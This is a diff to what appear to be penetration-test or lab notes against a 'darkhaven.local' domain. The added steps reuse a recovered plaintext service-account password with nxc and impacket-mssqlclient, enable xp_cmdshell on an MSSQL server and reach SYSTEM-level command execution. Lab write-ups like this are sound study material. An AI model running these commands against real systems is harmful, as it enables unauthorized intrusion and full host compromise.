@@ -36,3 +36,28 @@ nxc smb subnet2.txt -u 'sql_svc' -p 'SqLS3rvic3!' --shares
 ```python
 sql_svc : SqLS3rvic3!
 ```
+
+- we have access to the host sql.ext.darkhaven.local, we can test it using nxc
+```python
+nxc mssql sql.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!'
+## We confirmed that we have access based on the output
+```
+
+- Connecting with Impacket:
+```python
+impacket-mssqlclient darkhaven.local/sql_svc:'SqLS3rvic3!' @sql.ext.darkhaven.local
+```
+
+- Boom we got a shell 
+![[Pasted image 20260830110303.png]]
+
+![[Pasted image 20260830110453.png]]
+- Then we can try the `enable_xp_cmdshell` command 
+- Voila! we have acccess to `xp_cmdshell`!!!
+- Tried executing `whoami`
+```python
+xp_cmdshell whoami
+```
+
+and we got the result as `nt authority\system` and we've fully compromised the first machine !!
+![[Pasted image 20260830110813.png]]
